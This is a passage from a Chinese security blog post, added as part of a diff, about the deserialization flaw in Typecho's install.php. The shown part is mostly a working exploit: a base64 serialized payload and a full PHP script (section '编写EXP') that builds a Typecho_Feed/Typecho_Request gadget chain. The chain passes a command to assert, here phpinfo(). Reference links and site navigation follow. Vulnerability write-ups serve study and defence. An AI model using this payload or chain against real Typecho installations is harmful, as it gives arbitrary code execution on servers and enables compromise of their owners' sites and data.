+    [prefix] =&gt; typecho_
+)
+</code></pre><p>构造完成，序列化后使用base64加密，得到<strong>Payload</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjQ6IlRlc3QiOjA6e319czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToicGhwaW5mbygpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==</span><br></pre></td></tr></table></figure>
+<p><strong>使用方法看文首 0x01 部分</strong></p>
+<h2 id="0x05-编写EXP"><a href="#0x05-编写EXP" class="headerlink" title="0x05 编写EXP"></a>0x05 编写EXP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'phpinfo()'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">        <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $_type;</span><br><span class="line">        <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">                        <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">                );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">        <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>感谢 <strong>王松_Striker</strong> 和 <strong>p0</strong> </p>
+<p>附上参考链接</p>
+<p><a href="http://mp.weixin.qq.com/s/w2JuKtXpSJVFDNSz7s_xog" title="Typecho install.php 后门分析" target="_blank" rel="noopener">Typecho install.php 后门分析</a></p>
+<p><a href="http://p0sec.net/index.php/archives/114/" title="Typecho install.php 反序列化导致任意代码执行" target="_blank" rel="noopener">Typecho install.php 反序列化导致任意代码执行</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言　</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞探索"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞细节"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-编写EXP"><span class="toc-number">5.</span> <span class="toc-text">0x05 编写EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&text=Typecho install.php存在的反序列化漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&is_video=false&description=Typecho install.php存在的反序列化漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typecho install.php存在的反序列化漏洞&body=Check out this article: http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&name=Typecho install.php存在的反序列化漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 w0x0021
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
